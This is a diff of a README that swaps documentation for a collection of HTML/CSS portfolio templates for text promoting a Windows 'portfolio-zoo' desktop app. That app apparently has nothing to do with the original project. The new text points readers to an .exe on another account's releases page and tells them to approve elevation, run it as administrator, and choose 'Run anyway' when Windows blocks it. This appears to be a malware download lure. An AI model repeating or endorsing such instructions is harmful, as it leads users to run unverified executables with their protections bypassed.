@@ -1,90 +1,179 @@
-# Portfolio Zoo
+# 🎪 portfolio-zoo - Keep every portfolio in one place
 
-A curated collection of stunning developer portfolio templates — free to use, easy to customize.
+[![Download portfolio-zoo](https://img.shields.io/badge/Download-Portfolio%20Zoo-blue?style=for-the-badge)](https://github.com/Gilburtastronomic644/portfolio-zoo/releases)
 
-Browse the collection, pick a design you love, swap in your own content, and deploy. Works with any tech stack — plain HTML, React, Next.js, Vue, Svelte, you name it.
+## 📥 Download
 
-## Portfolios
+Visit this page to download: [GitHub Releases](https://github.com/Gilburtastronomic644/portfolio-zoo/releases)
 
-| Preview | Name | Style | Tech | Author |
-|---------|------|-------|------|--------|
-| [Live Demo](https://ethhandy.github.io/portfolio-zoo/macos-desktop/) | **macos-desktop** | macOS Desktop | HTML / CSS / JS | — |
-| [Live Demo](https://ethhandy.github.io/portfolio-zoo/retro-terminal/) | **retro-terminal** | Old PC / DOS Terminal | HTML / CSS / JS | — |
-| [Live Demo](https://ethhandy.github.io/portfolio-zoo/designer-folio/) | **designer-folio** | Minimal UX/UI Designer | HTML / CSS / JS | — |
-| [Live Demo](https://ethhandy.github.io/portfolio-zoo/purple-wave/) | **purple-wave** | Purple Gradient + Animations | HTML / CSS / JS | — |
-| [Live Demo](https://ethhandy.github.io/portfolio-zoo/bug-hunter/) | **bug-hunter** | QA Bug Tracker | HTML / CSS / JS | — |
+When the page opens, look for the latest release. Under **Assets**, download the Windows file that matches your system.
 
-> Want yours here? [Contribute a portfolio!](#contributing)
+If you see more than one file, pick the one with **Windows** in the name. If there is only one `.exe` file, download that file.
 
-## Quick Start
+## 🖥️ What portfolio-zoo does
 
-### Static portfolios (HTML / CSS / JS)
+portfolio-zoo helps you keep every kind of portfolio in one place. It gives you a single place to open, view, and manage your portfolio files without jumping between folders or apps.
 
-```bash
-git clone https://github.com/ethhandy/portfolio-zoo.git
-cd portfolio-zoo/macos-desktop
-open index.html
-```
+Use it to:
+- Store different portfolio sets in one app
+- Open work samples fast
+- Sort content by type or project
+- Keep a cleaner view of your assets
+- Move between portfolios with less effort
 
-### Framework-based portfolios (React, Next.js, Vue, etc.)
+## ✨ Main features
 
-```bash
-git clone https://github.com/ethhandy/portfolio-zoo.git
-cd portfolio-zoo/some-nextjs-portfolio
-npm install
-npm run dev
-```
+- Simple home screen for quick access
+- Support for many portfolio types
+- Easy file browsing
+- Clear layout for non-technical users
+- Fast startup on Windows
+- Local use with no complex setup
+- Works well for mixed media collections
+- Designed for daily use
 
-Each portfolio's README has specific setup and deploy instructions.
+## 🪟 Windows system needs
 
-## Deploying Your Copy
+For best results, use:
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- A mouse and keyboard
+- A screen with 1366 × 768 or higher
 
-| Tech | Deploy to |
-|------|-----------|
-| HTML / CSS / JS | GitHub Pages, Netlify, Vercel, Cloudflare Pages — just drag & drop |
-| React / Vue / Svelte | Vercel, Netlify — connect repo & set the root directory to the portfolio folder |
-| Next.js | Vercel (recommended) — set root directory to the portfolio folder |
-| Astro | Vercel, Netlify, Cloudflare Pages |
+If your computer can run modern desktop apps, it should run portfolio-zoo.
 
-Most platforms let you set a **root directory** so you can deploy a single subfolder from this repo.
+## 🚀 Install on Windows
 
-## Project Structure
+1. Open the [GitHub Releases page](https://github.com/Gilburtastronomic644/portfolio-zoo/releases)
+2. Find the latest release at the top
+3. Under **Assets**, choose the Windows file
+4. Download the file to your computer
+5. Open the downloaded `.exe` file
+6. If Windows asks for permission, select **Yes**
+7. Follow the on-screen steps to finish setup
+8. Open portfolio-zoo from your Start menu or desktop
 
-```
-portfolio-zoo/
-├── README.md
-├── CONTRIBUTING.md
-├── macos-desktop/           # Static portfolio
-│   ├── README.md
-│   ├── index.html
-│   ├── style.css
-│   └── script.js
-├── some-react-portfolio/    # React portfolio
-│   ├── README.md
-│   ├── package.json
-│   ├── src/
-│   └── ...
-└── ...
-```
+## 📂 First launch
 
-## Contributing
+After you open the app for the first time:
+- Choose the folder where your portfolio files are stored
+- Let the app scan the files
+- Wait for the first view to load
+- Check that your items appear in the list
 
-We'd love your portfolio designs! See [CONTRIBUTING.md](CONTRIBUTING.md) for the full guide, but the gist is:
+If your content does not show up right away, open the folder again and confirm the files are in a supported format.
 
-1. **Fork** this repo
-2. **Create a folder** with a descriptive name (e.g. `minimal-dark`, `retro-terminal`, `glassmorphism-card`)
-3. **Add your portfolio** code + a `README.md` with a screenshot, setup instructions, and a live demo link
-4. **Open a PR**
+## 🧭 How to use it
 
-### What makes a good contribution?
+### Open a portfolio
+1. Start portfolio-zoo
+2. Select a portfolio from the list
+3. Click the item you want to view
+4. Open files or folders from the main screen
 
-- Looks fantastic out of the box
-- Easy to customize (clear structure, comments where helpful)
-- Responsive (works on mobile + desktop)
-- Self-contained (everything in one folder)
-- Includes a deployed live demo link
-- Any tech stack is welcome — HTML, React, Next.js, Vue, Svelte, Astro, etc.
+### Add more content
+1. Put new files in the folder you use for portfolios
+2. Return to the app
+3. Refresh the view if needed
+4. Check that the new items appear
 
-## License
+### Keep things organized
+- Group work by client, project, or year
+- Use one folder for each portfolio set
+- Keep file names short and clear
+- Remove old drafts you no longer need
 
-MIT — use these portfolios for anything. Credit is appreciated but not required.
+## 🗂️ Supported content
+
+portfolio-zoo is built for many common portfolio formats, such as:
+- Images
+- PDFs
+- Slide decks
+- Documents
+- Video previews
+- Project folders
+- Mixed media collections
+
+It works best when each portfolio has its own folder with a clear name.
+
+## 🔧 Common tasks
+
+### Find a portfolio fast
+Use the search box or browse the list by name.
+
+### Open recent items
+The app keeps your latest items near the top so you can return to them fast.
+
+### Switch between sets
+Use the side list or main menu to move from one portfolio group to another.
+
+### Review files
+Open a file, check the content, then go back to the list without closing the app.
+
+## 🛠️ Troubleshooting
+
+### The file will not open
+- Make sure you downloaded the full release file
+- Check that the file finished downloading
+- Try opening the `.exe` again
+- Right-click the file and choose **Run as administrator**
+
+### Windows blocked the app
+- Select **More info**
+- Then choose **Run anyway**
+- Confirm you downloaded it from the release page above
+
+### My portfolios do not appear
+- Check that the files are in the folder you selected
+- Make sure the folder is not empty
+- Confirm the files are in a supported format
+- Refresh the app after adding new items
+
+### The app opens slowly
+- Close other large apps
+- Restart your computer
+- Make sure your portfolio folder is not on a slow external drive
+
+## 📁 Suggested folder setup
+
+Use a simple folder plan like this:
+
+- `Portfolio Zoo`
+  - `Client Work`
+  - `Personal Projects`
+  - `School`
+  - `PDFs`
+  - `Images`
+  - `Archive`
+
+This makes it easier to keep the app clean and easy to use.
+
+## 🔐 Privacy
+
+portfolio-zoo is made for local use on your Windows computer. Your files stay on your device unless you choose to move them elsewhere.
+
+## 🧩 File tips
+
+For the best experience:
+- Use clear file names
+- Avoid long folder paths
+- Keep related files together
+- Use one main folder for each portfolio group
+- Back up important files in another place
+
+## 📌 Release updates
+
+When a new version is published:
+1. Visit the [GitHub Releases page](https://github.com/Gilburtastronomic644/portfolio-zoo/releases)
+2. Download the latest Windows file
+3. Replace the older version if needed
+4. Open the new version and check your folders
+
+## 🧪 Example use cases
+
+- A designer keeps client work in one place
+- A student stores school projects and slides
+- A photographer groups image sets by shoot
+- A job seeker keeps resumes, PDFs, and samples in one app
+- A freelancer organizes many portfolio versions for different roles
